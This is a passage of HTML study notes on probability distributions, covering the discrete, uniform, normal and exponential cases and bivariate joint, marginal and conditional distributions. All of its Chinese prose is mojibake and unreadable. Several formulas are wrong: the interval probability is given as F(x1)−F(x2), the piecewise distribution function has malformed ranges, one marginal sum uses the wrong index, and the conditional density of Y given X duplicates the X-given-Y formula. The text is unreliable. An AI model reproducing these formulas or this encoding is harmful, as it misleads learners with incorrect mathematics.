title="è¶…å‡ ä½•åˆ†å¸ƒ"></a>è¶…å‡ ä½•åˆ†å¸ƒ</h4><p>è‹¥éšæœºå˜é‡ X çš„æ¦‚ç‡åˆ†å¸ƒå¾‹ä¸º:<br>$$<br>\displaylines{P(X &#x3D; k) &#x3D; \frac{C_a^k C_b^{n-k}}{C_N^n}, \ \ \ k &#x3D; l_1, l_1 + 1, â€¦, l_2 \newline~ \newline<br>å…¶ä¸­,\ l_1 &#x3D; max(0,n-b), \ l_2 &#x3D; min(a,n)}<br>$$<br>ç§° X æœä» <mark>è¶…å‡ ä½•åˆ†å¸ƒ</mark> </p><p>å…¶ä¸ºä»€ä¹ˆå«è¶…å‡ ä½•åˆ†å¸ƒå¯ä»¥æŸ¥çœ‹å…¶ä»–åšå®¢.</p><h4 id="å‡ ä½•åˆ†å¸ƒ"><a href="#å‡ ä½•åˆ†å¸ƒ" class="headerlink" title="å‡ ä½•åˆ†å¸ƒ"></a>å‡ ä½•åˆ†å¸ƒ</h4><p> è‹¥éšæœºå˜é‡ X çš„æ¦‚ç‡åˆ†å¸ƒå¾‹ä¸º:<br> $$<br> \displaylines{P(X &#x3D; k) &#x3D; p(1-p)^{k-1}, \ \ k&#x3D;1,2,3,â€¦, \ \ 0 &lt; p &lt; 1}<br> $$<br>ç§° X æœä»å‚æ•° p çš„å‡ ä½•åˆ†å¸ƒ.</p><h4 id="å·´æ–¯å¡åˆ†å¸ƒ"><a href="#å·´æ–¯å¡åˆ†å¸ƒ" class="headerlink" title="å·´æ–¯å¡åˆ†å¸ƒ"></a>å·´æ–¯å¡åˆ†å¸ƒ</h4><p> è‹¥éšæœºå˜é‡ X çš„æ¦‚ç‡åˆ†å¸ƒå¾‹ä¸º:<br> $$<br> \displaylines{P(X&#x3D;k) &#x3D; C_{k-1}^{r-1} p^r (1-p)^{k-r}, \ \ k&#x3D;r, r+1, r+2, â€¦, \newline~ \newline<br>å…¶ä¸­r ä¸ºæ•´æ•°, \ 0 &lt; p &lt; 1}<br> $$</p><h2 id="éšæœºå˜é‡çš„åˆ†å¸ƒå‡½æ•°"><a href="#éšæœºå˜é‡çš„åˆ†å¸ƒå‡½æ•°" class="headerlink" title="éšæœºå˜é‡çš„åˆ†å¸ƒå‡½æ•°"></a>éšæœºå˜é‡çš„åˆ†å¸ƒå‡½æ•°</h2><blockquote><p>å®šä¹‰</p></blockquote><p>éšæœºå˜é‡ $X$, è‹¥å¯¹ä»»æ„å®æ•° $x$, å‡½æ•°<br>$$<br>\displaylines{F(x) &#x3D; P(X \le x)}<br>$$ </p><p>ç§° $X$ çš„åˆ†å¸ƒå‡½æ•°. æ¦‚ç‡å‡½æ•°çš„å€¼æ˜¯ç´¯åŠ çš„ç»“æœï¼Œå› æ­¤ä¹Ÿå« <mark>ç´¯åŠ æ¦‚ç‡å‡½æ•°</mark>.</p><p>æ¯”å¦‚: $X$ æ˜¯ç¦»æ•£çš„ï¼Œå¯ä»¥å–å¾—å€¼ä¸º $1,2,3,4$, å…¶å¯¹åº”çš„æ¦‚ç‡åˆ†åˆ«ä¸º $0.1, 0.2, 0.3, 0.4$é‚£ä¹ˆ:<br>$$<br>\displaylines{F(1) &#x3D; P(X \le 1) &#x3D; P(1) &#x3D; 0.1 \newline~ \newline<br>F(2) &#x3D; P(X \le 2) &#x3D; P(1) + P(2) &#x3D; 0.1 + 0.2 &#x3D; 0.3 \newline~ \newline<br>F(3) &#x3D; P(X \le 3) &#x3D; P(1) + P(2) + P(3)&#x3D; 0.1 + 0.2 + 0.3 &#x3D; 0.6 \newline~ \newline<br>F(4) &#x3D; P(X \le 4) &#x3D; P(1) + P(2) + P(3) + P(4)&#x3D; 0.1 + 0.2 + 0.3 + 0.4 &#x3D; 1 }<br>$$</p><p>å…¶åˆ†å¸ƒå‡½æ•°å¯ä»¥å†™ä¸º:<br>$$<br>\displaylines{F(x) &#x3D; P(X \le x) &#x3D;<br>\begin{cases}<br>0, \ \ x &lt; 1 \newline~ \newline<br>0.1, \ \ x &lt; 2 \newline~ \newline<br>0.3, \ \ 2 \ge x &lt; 3 \newline~ \newline<br>0.6, \ \ 3 \ge x &lt; 4 \newline~ \newline<br>1, \ \ 4 \ge x<br>\end{cases}}<br>$$</p><p>å›¾åƒä¸º:<br><img src="/../img/graph_of_probability_distribution_function.jpg"></p><blockquote><p>æ€§è´¨</p></blockquote><ul><li>$0 \le F(x) \le 1$</li><li>$F(x)$ å•è°ƒä¸å‡, ä¸” $F(-\infty) &#x3D; 0, \ \ F(+\infty) &#x3D; 1$</li><li>F(x) æœ‰è¿ç»­ï¼Œå³ $F(x+0) &#x3D; F(x)$</li></ul><h2 id="è¿ç»­å‹éšæœºå˜é‡åŠå…¶æ¦‚ç‡å¯†åº¦å‡½æ•°"><a href="#è¿ç»­å‹éšæœºå˜é‡åŠå…¶æ¦‚ç‡å¯†åº¦å‡½æ•°" class="headerlink" title="è¿ç»­å‹éšæœºå˜é‡åŠå…¶æ¦‚ç‡å¯†åº¦å‡½æ•°"></a>è¿ç»­å‹éšæœºå˜é‡åŠå…¶æ¦‚ç‡å¯†åº¦å‡½æ•°</h2><blockquote><p>å®šä¹‰</p></blockquote><p>å¯¹äºéšæœºå˜é‡ $X$ çš„åˆ†å¸ƒå‡½æ•° $F(x)$, è‹¥å­˜åœ¨éè´Ÿçš„å‡½æ•° $f(x)$, ä½¿å¯¹äºä»»æ„å®æ•° $x$, æœ‰:<br>$$<br>\displaylines{F(x) &#x3D; \int_{-\infty}^x f(t) dt}<br>$$</p><p>(ç§¯åˆ†å¼ï¼Œæ±‚é¢ç§¯, $f(t)$ ä¸ºæ›²çº¿æ‰€åœ¨çš„å‡½æ•°)</p><p>åˆ™ç§° $X$ ä¸º <mark>è¿ç»­å‹éšæœºä¾¿æ¥èƒ½å¤Ÿ</mark> , å…¶ä¸­ $f(x)$ ç§°ä¸º X çš„ <mark>æ¦‚ç‡å¯†åº¦å‡½æ•°</mark>, ç®€ç§°å¯†åº¦å‡½æ•° ï¼Œ</p><blockquote><p>$f(x)$ çš„æ€§è´¨</p></blockquote><ul><li>$f(x) \ge 0$</li><li>$\int_{-\infty}^{+\infty} f(x) dx &#x3D; 1$</li><li>å¯¹äºä»»æ„å®æ•° $x_1, x_2 \ (x_2 &gt; x_1)$</li></ul><p>$$<br>\displaylines{P{x_1 &lt; X \le x_2} &#x3D; F(x_1) - F(x_2) &#x3D; \int_{x_1}^{x_2} f(t) dt}<br>$$</p><ul><li>åœ¨ $f(x)$ è¿ç»­ç‚¹ $x$, $F^\prime (x) &#x3D; f(x)$</li></ul><p><img src="/../img/probability_density_curve.png"></p><h3 id="å‡ ä¸ªé‡è¦çš„è¿ç»­å‹éšæœºå˜é‡åˆ†å¸ƒ"><a href="#å‡ ä¸ªé‡è¦çš„è¿ç»­å‹éšæœºå˜é‡åˆ†å¸ƒ" class="headerlink" title="å‡ ä¸ªé‡è¦çš„è¿ç»­å‹éšæœºå˜é‡åˆ†å¸ƒ"></a>å‡ ä¸ªé‡è¦çš„è¿ç»­å‹éšæœºå˜é‡åˆ†å¸ƒ</h3><h4 id="å‡åŒ€åˆ†å¸ƒ"><a href="#å‡åŒ€åˆ†å¸ƒ" class="headerlink" title="å‡åŒ€åˆ†å¸ƒ"></a>å‡åŒ€åˆ†å¸ƒ</h4><blockquote><p>å®šä¹‰</p></blockquote><p>è®¾éšæœºå˜é‡ $X$ å…·æœ‰æ¦‚ç‡å¯†åº¦å‡½æ•°:</p><p>$$<br>\displaylines{f(x) &#x3D;<br>\begin{cases}<br>\frac{1}{b-a}, \ \ x \in (a,b) \newline~ \newline<br>0, \ \ å…¶ä»–<br>\end{cases}}<br>$$</p><p>ç§° $X$ åœ¨åŒºé—´ (a,b) ä¸Šæœä» <mark>å‡åŒ€åˆ†å¸ƒ</mark>.</p><p>è®°ä¸º $X \sim U(a,b)$. (U å¯èƒ½æ˜¯æŒ‡ Uniform)</p><p><img src="/../img/uniform_distribution.png"></p><p>å¯çœ‹å‡ºï¼Œåœ¨ $x \in (a,b)$ å…¶ç§¯åˆ†å‡ºæ¥çš„å€¼å‡åŒ€å˜åŒ–.</p><p>ä¸ºä»€ä¹ˆæœ€å¤§å€¼ä¸º $\frac{1}{b - a}$ ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼ŒçŸ©å½¢çš„é¢ç§¯ä¸º $1$, åº•è¾¹ä¸º $b - a$, é‚£ä¹ˆé«˜å°±ä¸º $\frac{1}{b - a}$</p><h4 id="æ­£æ€åˆ†å¸ƒ"><a href="#æ­£æ€åˆ†å¸ƒ" class="headerlink" title="æ­£æ€åˆ†å¸ƒ"></a>æ­£æ€åˆ†å¸ƒ</h4><blockquote><p>å®šä¹‰</p></blockquote><p>è®¾ $X$ çš„æ¦‚ç‡å¯†åº¦å‡½æ•°ä¸º:<br>$$<br>\displaylines{f(x) &#x3D; \frac{1}{\sqrt{2 \pi} \sigma} e^{- \frac{(x - \mu)^2}{2 \sigma^2}}, \ \ - \infty &lt; x &lt; + \infty, \newline~ \newline<br>å…¶ä¸­ -\infty &lt; \mu &lt; \infty, \ \ \sigma &gt; 0 ä¸ºå¸¸æ•°}<br>$$</p><p>ç§° $X$ æœä»å‚æ•° $\mu, \ \sigma$ çš„æ­£æ€åˆ†å¸ƒ (Gauss åˆ†å¸ƒ), è®°ä¸º $X \sim N(\mu, \sigma^2)$</p><blockquote><p>æ­£æ€åˆ†å¸ƒåç§°çš„ç”±æ¥</p></blockquote><p>æ­£æ€åˆ†å¸ƒ (normal distribution). ç”±äºè¿™ç§æ•°æ®åˆ†å¸ƒå¤ªè¿‡äºå¸¸è§ï¼ŒåŸºæœ¬èƒ½æè¿°æ‰€æœ‰å¸¸è§çš„äº‹åŠ¡å’Œç°è±¡ï¼Œå› æ­¤ä¸º normal çš„ distribution.</p><blockquote><p>æ€§è´¨</p></blockquote><ul><li>$f(x)$ å…³äº $x &#x3D; \mu$ å¯¹ç§°</li><li>$f_{max} &#x3D; f(\mu) &#x3D; \frac{1}{\sqrt{2 \pi} \sigma}$</li><li>$\underset{\left\vert x - \mu \right\vert \to \infty}{\lim} f(x) &#x3D; 0$</li></ul><blockquote><p>å›¾åƒ</p></blockquote><p><img src="/../img/normal_distribution.png"></p><p>å½“ $\sigma$ å›ºå®šæ—¶ï¼Œ $\mu$ è®©å¯†åº¦å‡½æ•°æ²¿ x è½´åšå¹³ç§»å˜æ¢ (å³ï¼Œå†³å®šå¯¹ç§°è½´çš„ä½ç½®):</p><p><img src="/../img/normal_distribution_change_mu.png"></p><p>å½“ $\mu$ å›ºå®šæ—¶ï¼Œ$\sigma$ å½±å“å›¾åƒçš„å®½åº¦ï¼Œä½†å›¾åƒçš„æ€»é¢ç§¯ä¸å˜, å› æ­¤:</p><p><img src="/../img/normal_distribution_change_sigma.png"></p><p>è‹¥ $Z \sim N(0,1)$, ç§° $Z$ æœä» <mark>æ ‡å‡†æ­£æ€åˆ†å¸ƒ</mark>:</p><p>$Z$ çš„å¯†åº¦å‡½æ•°ä¸º:<br>$$<br>\displaylines{ \phi (x) &#x3D; \frac{1}{\sqrt{2 \pi}} e ^{- \frac{x^2}{2}} }<br>$$</p><p>$Z$ çš„åˆ†å¸ƒå‡½æ•°ä¸º:<br>$$<br>\displaylines{ \phi (x) &#x3D; \int_{-\infty}^x \frac{1}{\sqrt{2 \pi}} e ^{- \frac{t^2}{2}} dt}<br>$$</p><p><img src="/../img/standard_normal_distribution.png"></p><blockquote><p>æ­£æ€åˆ†å¸ƒè½¬æ¢ä¸ºæ ‡å‡†æ­£æ€åˆ†å¸ƒè®¡ç®—</p></blockquote><p>$$<br>\displaylines{P(X \le b) &#x3D; \int_{-\infty}^b \frac{1}{\sqrt{2 \pi} \sigma} e^{- \frac{(x - \mu)^2}{2 \sigma^2}} dx \newline~ \newline<br>\frac{x - \mu}{\sigma} &#x3D; t \newline~ \newline<br>P(X \le b) &#x3D; \int_{-\infty}^{ \frac{b- \mu}{\sigma}} \frac{1}{\sqrt{2 \pi}} e^{- \frac{(t)^2}{2}} dt \newline~ \newline<br>P(X \le b) &#x3D; \phi ( \frac{b - \mu}{\sigma})}<br>$$</p><h4 id="æŒ‡æ•°åˆ†å¸ƒ"><a href="#æŒ‡æ•°åˆ†å¸ƒ" class="headerlink" title="æŒ‡æ•°åˆ†å¸ƒ"></a>æŒ‡æ•°åˆ†å¸ƒ</h4><p>è¿™é‡Œçš„æŒ‡æ•°æŒ‡ <mark>è‡ªç„¶æŒ‡æ•°</mark> </p><blockquote><p>å®šä¹‰</p></blockquote><p>è®¾ $X$ çš„å¯†åº¦å‡½æ•°ä¸º<br>$$<br>\displaylines{f(x) &#x3D;<br>\begin{cases}<br>\lambda e^{- \lambda x}, \ \ x &gt; 0 \newline~ \newline<br>0, \ \ x \le 0<br>\end{cases} \newline~ \newline<br>å…¶ä¸­ \lambda &gt; 0 ä¸ºå¸¸æ•°}<br>$$<br>åˆ™ç§° $X$ æœä»å‚æ•°ä¸º $\lambda$ çš„ <mark>æŒ‡æ•°åˆ†å¸ƒ</mark> </p><p>è®°ä¸º $X \sim E( \lambda )\ æˆ–\ X \sim Exp( \lambda )$ (è¿™é‡Œçš„ E æŒ‡ Exponent)</p><p>$X$ çš„åˆ†å¸ƒå‡½æ•°ä¸º:<br>$$<br>\displaylines{F(x) &#x3D; \int f(x) &#x3D;<br>\begin{cases}<br>\int \lambda e^{- \lambda x} dx &#x3D; 1 - e^{- \lambda x}, \ \ x &gt; 0 \newline~ \newline<br>\int 0 dx &#x3D; 0, \ \ x \le 0<br>\end{cases}}<br>$$</p><blockquote><p>æ€§è´¨</p></blockquote><ul><li>æ— è®°å¿†æ€§</li></ul><p>å³ï¼Œå¦‚æœXè¡¨ç¤ºç­‰å¾…æ—¶é—´,é‚£ä¹ˆæ— è®°å¿†æ€§è¯´æ˜åªè¦è¿˜æ²¡ç­‰åˆ°,é‚£ä¹ˆå‰©ä½™ç­‰å¾…æ—¶é—´ä»ç„¶æœä»å‚æ•°ä¸ºÎ»çš„æŒ‡æ•°åˆ†å¸ƒ.</p><p>æ•°å­¦è¯­è¨€æè¿°å¦‚ä¸‹:<br>$$<br>\displaylines{ t_0 &gt; 0,\ t &gt; 0 \newline~ \newline<br>P(X &gt; t_0 + t| X &gt; t_0) &#x3D; \frac{P(X &gt; t_0 + t)}{P(X &gt; t_0)} \newline~ \newline<br>&#x3D; \frac{1 - F(t_0 + t)}{1 - F(t_0)} \newline~ \newline<br>&#x3D; P(X &gt; t) }<br>$$</p><p>$t$ ä¸ºè¿˜éœ€ç­‰å¾…çš„æ—¶é—´ï¼Œå’Œä¹‹å‰å·²ç»ç­‰å¾…äº†å¤šä¹…æ— å…³.</p><h2 id="éšæœºå˜é‡å‡½æ•°çš„åˆ†å¸ƒ"><a href="#éšæœºå˜é‡å‡½æ•°çš„åˆ†å¸ƒ" class="headerlink" title="éšæœºå˜é‡å‡½æ•°çš„åˆ†å¸ƒ"></a>éšæœºå˜é‡å‡½æ•°çš„åˆ†å¸ƒ</h2><p>è§ PPT.</p><h1 id="ç¬¬ä¸‰ç« -å¤šå…ƒéšæœºå˜é‡åŠå…¶åˆ†å¸ƒ"><a href="#ç¬¬ä¸‰ç« -å¤šå…ƒéšæœºå˜é‡åŠå…¶åˆ†å¸ƒ" class="headerlink" title="ç¬¬ä¸‰ç«  å¤šå…ƒéšæœºå˜é‡åŠå…¶åˆ†å¸ƒ"></a>ç¬¬ä¸‰ç«  å¤šå…ƒéšæœºå˜é‡åŠå…¶åˆ†å¸ƒ</h1><h2 id="äºŒå…ƒç¦»æ•£å‹éšæœºå˜é‡"><a href="#äºŒå…ƒç¦»æ•£å‹éšæœºå˜é‡" class="headerlink" title="äºŒå…ƒç¦»æ•£å‹éšæœºå˜é‡"></a>äºŒå…ƒç¦»æ•£å‹éšæœºå˜é‡</h2><blockquote><p>å®šä¹‰</p></blockquote><p>è®¾ E æ˜¯ä¸€ä¸ªéšæœºè¯•éªŒï¼Œæ ·æœ¬ç©ºé—´ $S &#x3D; {e}$, è®¾ $X &#x3D; X(e)\ å’Œ\ Y &#x3D; Y(e)$ æ˜¯å®šä¹‰åœ¨ S ä¸Šçš„éšæœºå˜é‡, ç”±å®ƒä»¬æ„æˆçš„å‘é‡ $(X,Y)$ å«åš <mark>äºŒå…ƒéšæœºå˜é‡</mark>  æˆ– <mark>äºŒç»´éšæœºå˜é‡</mark>.</p><h3 id="è”åˆæ¦‚ç‡åˆ†å¸ƒ"><a href="#è”åˆæ¦‚ç‡åˆ†å¸ƒ" class="headerlink" title="è”åˆæ¦‚ç‡åˆ†å¸ƒ"></a>è”åˆæ¦‚ç‡åˆ†å¸ƒ</h3><blockquote><p>å®šä¹‰</p></blockquote><p>è‹¥äºŒå…ƒéšæœºå˜é‡ $(X,Y)$ å¯èƒ½å–åˆ°çš„ <mark>ä¸åŒå€¼</mark> æ˜¯æœ‰å¯¹æˆ–å¯åˆ—æ— å¯¹, åˆ™ç§° $(X,Y)$ æ˜¯ç¦»æ•£å‹éšæœºå˜é‡.</p><blockquote><p>ç¦»æ•£å‹éšæœºå˜é‡çš„è”åˆæ¦‚ç‡åˆ†å¸ƒå¾‹:</p></blockquote><p><img src="/../img/law_of_joint_probability_distribution.png"></p><p>å¯¹äºç¦»æ•£å‹éšæœºå˜é‡ $(X,Y)$, è”åˆåˆ†å¸ƒå¾‹ä¸º:<br>$$<br>\displaylines{P(X&#x3D;x_{i}, Y&#x3D;y_{j}) &#x3D; p_{ij}, \ \ i,j &#x3D; 1,2â€¦}<br>$$</p><p>(å¯¹äºæ¯ä¸€ä¸ªæ¦‚ç‡è€Œè¨€ï¼Œ $X,Y$ çš„å€¼éƒ½ç»™å®š)</p><blockquote><p>æ€§è´¨</p></blockquote><ul><li>$p_{ij} \ge 0, \ \ i,j &#x3D; 1,2â€¦$ (å³æ¯ä¸€ä¸ªæ¦‚ç‡éƒ½å¤§äº 0)</li><li>$\sum_{i&#x3D;1}^\infty \sum_{j&#x3D;1}^\infty p_{ij} &#x3D; 1$ (å³å…¨éƒ¨ç›¸åŠ ä¸º 1)</li></ul><h3 id="è¾¹é™…åˆ†å¸ƒ"><a href="#è¾¹é™…åˆ†å¸ƒ" class="headerlink" title="è¾¹é™…åˆ†å¸ƒ"></a>è¾¹é™…åˆ†å¸ƒ</h3><p>è¾¹é™…æŒ‡çš„æ˜¯ $(X,Y)$ ä¸­æœ‰ä¸€ä¸ªå€¼ç¡®å®šæ—¶è®¡ç®—æ¦‚ç‡åˆ†å¸ƒ.</p><p>å¯¹äºç¦»æ•£å‹éšæœºå˜é‡ $(X,Y)$, è¾¹é™…åˆ†å¸ƒå¾‹ä¸º:<br>$$<br>\displaylines{P(Y&#x3D;y_j) &#x3D; P(X&lt; +\infty, Y&#x3D;y_j) &#x3D; \sum_{i&#x3D;1}^\infty p_{ij} &#x3D; p_{\bullet j} \ \ , j &#x3D; 1,2â€¦ \newline~ \newline<br>P(X&#x3D;x_i) &#x3D; P(X&#x3D;x_i, Y&lt; +\infty) &#x3D; \sum_{i&#x3D;1}^\infty p_{ij} &#x3D; p_{j\bullet} \ \ , i &#x3D; 1,2â€¦}<br>$$</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚ $p_{\bullet j}$, å¦‚ $j&#x3D;1$ å°±æ˜¯æ±‚ $p_{11} + p_{21} + p_{31}â€¦$</p><h3 id="æ¡ä»¶åˆ†å¸ƒ"><a href="#æ¡ä»¶åˆ†å¸ƒ" class="headerlink" title="æ¡ä»¶åˆ†å¸ƒ"></a>æ¡ä»¶åˆ†å¸ƒ</h3><blockquote><p>å®šä¹‰</p></blockquote><p>è®¾ $(X,Y)$ æ˜¯äºŒå…ƒç¦»æ•£å‹éšæœºå˜é‡ï¼Œå¯¹äºå›ºå®šçš„ $y_j$, è‹¥ $P(Y&#x3D;y_i) &gt; 0$, ç§°:</p><p>$$<br>\displaylines{P(X&#x3D;x_i|Y&#x3D;y_j) &#x3D; \frac{P(X&#x3D;x_i, Y&#x3D;y_j)}{P(Y&#x3D;y_j)} &#x3D; \frac{p_{ij}}{p_{\bullet j}}, \ \ i &#x3D; 1,2â€¦}<br>$$</p><p>(ä¸Šé¢ä¸º <mark>æ¡ä»¶æ¦‚ç‡å…¬å¼</mark> )</p><p>ä¸ºåœ¨ ${Y&#x3D;y_j}$ æ¡ä»¶ä¸‹ï¼Œéšæœºå˜é‡ $X$ çš„æ¡ä»¶åˆ†å¸ƒå¾‹.</p><blockquote><p>æ™®é€šçš„æ¡ä»¶æ¦‚ç‡å’ŒäºŒå…ƒç¦»æ•£å‹éšæœºå˜é‡çš„æ¡ä»¶æ¦‚ç‡</p></blockquote><p>ä¸¤ä¸ªäº‹ä»¶ $A,B$ çš„æ¡ä»¶æ¦‚ç‡: è‹¥ $P(A) &gt; 0$, è€ƒè™‘æ¡ä»¶æ¦‚ç‡ $P(B|A)$</p><p>å¯¹äºäºŒå…ƒç¦»æ•£å‹å˜é‡ $(X,Y)$ çš„æ¡ä»¶æ¦‚ç‡, å·²çŸ¥å…¶åˆ†å¸ƒå¾‹ä¸º:<br>$$<br>\displaylines{P(X&#x3D;x_i, Y&#x3D;y_j) &#x3D; p_{ij} , \ \ i,j &#x3D; 1,2â€¦}<br>$$<br>è‹¥ $P(Y&#x3D;y_j) &#x3D; p_{\bullet j} &gt; 0$, è€ƒè™‘æ¡ä»¶æ¦‚ç‡ $P(X&#x3D;x_i | Y&#x3D;y_j)$</p><h2 id="äºŒå…ƒéšæœºå˜é‡çš„åˆ†å¸ƒå‡½æ•°"><a href="#äºŒå…ƒéšæœºå˜é‡çš„åˆ†å¸ƒå‡½æ•°" class="headerlink" title="äºŒå…ƒéšæœºå˜é‡çš„åˆ†å¸ƒå‡½æ•°"></a>äºŒå…ƒéšæœºå˜é‡çš„åˆ†å¸ƒå‡½æ•°</h2><h3 id="è”åˆåˆ†å¸ƒå‡½æ•°"><a href="#è”åˆåˆ†å¸ƒå‡½æ•°" class="headerlink" title="è”åˆåˆ†å¸ƒå‡½æ•°"></a>è”åˆåˆ†å¸ƒå‡½æ•°</h3><p>åˆ†å¸ƒå‡½æ•°çš„å€¼éƒ½æ˜¯æ¦‚ç‡çš„ç´¯åŠ .</p><blockquote><p>å®šä¹‰</p></blockquote><p>è®¾ $(X,y)$ æ˜¯äºŒå…ƒéšæœºå˜é‡ï¼Œå¯¹äºä»»æ„å®æ•° $x,y$, äºŒå…ƒå‡½æ•°:<br>$$<br>\displaylines{F(x,y) &#x3D; P{(X \le x) \cap (Y \le y)} \newline~ \newline<br>\overset{è®°æˆ}{&#x3D;} P(X \le x, Y \le y)}<br>$$<br>ç§°ä¸ºäºŒå…ƒéšæœºå˜é‡ $(X,Y)$ çš„ <mark>è”åˆåˆ†å¸ƒå‡½æ•°</mark> </p><blockquote><p>æ€§è´¨</p></blockquote><ul><li>$F(x,y)$ å…³äº $x,y$ å•è°ƒä¸å‡</li><li>$0 \le F(x,y) \le 1, \ F(+\infty, +\infty) &#x3D; 1$</li><li>$F(x,y)$ å…³äº $x,y$ å³è¿ç»­</li></ul><h3 id="è¾¹é™…åˆ†å¸ƒå‡½æ•°"><a href="#è¾¹é™…åˆ†å¸ƒå‡½æ•°" class="headerlink" title="è¾¹é™…åˆ†å¸ƒå‡½æ•°"></a>è¾¹é™…åˆ†å¸ƒå‡½æ•°</h3><p>äºŒå…ƒéšæœºå˜é‡ $(X,Y)$ çš„è¾¹é™…åˆ†å¸ƒå‡½æ•°:<br>$$<br>\displaylines{F_X(x) &#x3D; F(x,+\infty) &#x3D; P(X \le x) &#x3D; P(X \le x, Y \le +\infty)\newline~ \newline<br>F_Y(y) &#x3D; F(+\infty,y) &#x3D; P(Y \le y) &#x3D; P(X \le +\infty, Y \le y)}<br>$$</p><p>( <mark>ä¸‹æ ‡</mark> è¡¨æ˜æ‹¬å·é‡Œçš„æ˜¯è°çš„å€¼ï¼Œå¦‚ $F_X(x)$, ä¸‹æ ‡æ˜¯ $X$, æ‹¬å·é‡Œçš„ $x$ ä»£è¡¨çš„å°±æ˜¯ $X$ çš„å€¼)</p><h3 id="æ¡ä»¶åˆ†å¸ƒå‡½æ•°"><a href="#æ¡ä»¶åˆ†å¸ƒå‡½æ•°" class="headerlink" title="æ¡ä»¶åˆ†å¸ƒå‡½æ•°"></a>æ¡ä»¶åˆ†å¸ƒå‡½æ•°</h3><blockquote><p>å®šä¹‰</p></blockquote><p>è‹¥ $P(Y&#x3D;y) &gt; 0$, åˆ™åœ¨ ${Y&#x3D;y}$ æ¡ä»¶ä¸‹ï¼Œ $X$ çš„æ¡ä»¶åˆ†å¸ƒå‡½æ•°ä¸º:<br>$$<br>\displaylines{F(x|y) &#x3D; P(X \le x | Y &#x3D; y) &#x3D; \frac{P(X \le x, Y &#x3D; y)}{P(Y&#x3D;y)}}<br>$$</p><h2 id="äºŒå…ƒè¿ç»­å‹éšæœºå˜é‡"><a href="#äºŒå…ƒè¿ç»­å‹éšæœºå˜é‡" class="headerlink" title="äºŒå…ƒè¿ç»­å‹éšæœºå˜é‡"></a>äºŒå…ƒè¿ç»­å‹éšæœºå˜é‡</h2><p>ç¦»æ•£å‹ç§° â€“ åˆ†å¸ƒå‡½æ•°</p><p>è¿ç»­å‹ç§° â€“ å¯†åº¦å‡½æ•°</p><p>å¯†åº¦å‡½æ•°å°±æ˜¯è¢«ç§¯åˆ†çš„å‡½æ•°.</p><p>éƒ½æœ‰:</p><ul><li>è”åˆ</li><li>è¾¹é™…</li><li>æ¡ä»¶</li></ul><h3 id="è”åˆæ¦‚ç‡å¯†åº¦å‡½æ•°"><a href="#è”åˆæ¦‚ç‡å¯†åº¦å‡½æ•°" class="headerlink" title="è”åˆæ¦‚ç‡å¯†åº¦å‡½æ•°"></a>è”åˆæ¦‚ç‡å¯†åº¦å‡½æ•°</h3><blockquote><p>å®šä¹‰</p></blockquote><p>å¯¹äºäºŒå…ƒéšæœºå˜é‡ $(X,Y)$ çš„åˆ†å¸ƒå‡½æ•° $F(x,y)$, å¦‚æœå­˜åœ¨éè´Ÿå‡½æ•° $f(x,y)$, ä½¿å¯¹äºä»»æ„ $x,y$ æœ‰:<br>$$<br>\displaylines{F(x,y) &#x3D; \int_{- \infty}^y \int_{- \infty}^xf(\mu,v) d\mu dv}<br>$$</p><p>ç§° $(X,Y)$ ä¸ºäºŒå…ƒ <mark>è¿ç»­å‹</mark> éšæœºå˜é‡.</p><p>ç§° $f(x,y)$ ä¸ºäºŒå…ƒéšæœºå˜é‡ (X,Y) çš„ <mark>è”åˆæ¦‚ç‡å¯†åº¦å‡½æ•°</mark> </p><blockquote><p>æ€§è´¨</p></blockquote><ul><li>$f(x,y) \ge 0$</li><li>$\int_{-\infty}^{+\infty} \int_{-\infty}^{+\infty} f(x,y) dx dy &#x3D; 1$</li><li>  $$<br>  \displaylines{ \frac{\partial ^2 F(x,y)}{\partial x \partial y} &#x3D; f(x,y)}<br>  $$</li></ul><h3 id="è¾¹é™…æ¦‚ç‡å¯†åº¦å‡½æ•°"><a href="#è¾¹é™…æ¦‚ç‡å¯†åº¦å‡½æ•°" class="headerlink" title="è¾¹é™…æ¦‚ç‡å¯†åº¦å‡½æ•°"></a>è¾¹é™…æ¦‚ç‡å¯†åº¦å‡½æ•°</h3><p>$$<br>\displaylines{f_X(x) &#x3D; \int_{-\infty}^{+\infty}f(x,y) dy \newline~ \newline<br>f_Y(y) &#x3D; \int_{-\infty}^{+\infty}f(x,y) dx}<br>$$</p><p>( <mark>ä¸‹æ ‡</mark> è¡¨æ˜æ‹¬å·é‡Œçš„æ˜¯è°çš„å€¼ï¼Œå¦‚ $f_X(x)$, ä¸‹æ ‡æ˜¯ $X$, æ‹¬å·é‡Œçš„ $x$ ä»£è¡¨çš„å°±æ˜¯ $X$ çš„å€¼ç¡®å®š)</p><h3 id="æ¡ä»¶æ¦‚ç‡å¯†åº¦å‡½æ•°"><a href="#æ¡ä»¶æ¦‚ç‡å¯†åº¦å‡½æ•°" class="headerlink" title="æ¡ä»¶æ¦‚ç‡å¯†åº¦å‡½æ•°"></a>æ¡ä»¶æ¦‚ç‡å¯†åº¦å‡½æ•°</h3><p>åœ¨ ${ Y &#x3D; y }$ æ¡ä»¶ä¸‹X çš„æ¡ä»¶å¯†åº¦å‡½æ•°ä¸º<br>$$<br>\displaylines{f_{X|Y}(x|y) &#x3D; \frac{f(x,y)}{f_Y(y)} , \ \ f_Y(y) &gt; 0}<br>$$</p><p>åœ¨ ${X &#x3D; x }$æ¡ä»¶ä¸‹,Yçš„æ¡ä»¶å¯†åº¦å‡½æ•°ä¸º<br>$$<br>\displaylines{f_{X|Y}(x|y) &#x3D; \frac{f(x,y)}{f_Y(y)} , \ \ f_Y(y) &gt; 0}<br>$$</p><blockquote><p>æ€§è´¨</p></blockquote><ul><li>$f_{X|Y}(x|y) \ge 0$</li><li>$\int_{-\infty}^{+\infty} f_{X|Y}(x|y) dx &#x3D; 1$</li><li>$P{a &lt; X &lt; b|Y&#x3D; y} &#x3D; \int_a^b f_{X|Y}(x|y) dx$</li><li>$f(x,y) &#x3D; f_{X|Y}(x|y)f_Y(y) &#x3D; f_X(x) f_{X|Y}(x|y)$</li></ul><h3 id="äºŒå…ƒå‡åŒ€åˆ†å¸ƒä¸äºŒå…ƒæ­£æ€åˆ†å¸ƒ"><a href="#äºŒå…ƒå‡åŒ€åˆ†å¸ƒä¸äºŒå…ƒæ­£æ€åˆ†å¸ƒ" class="headerlink" 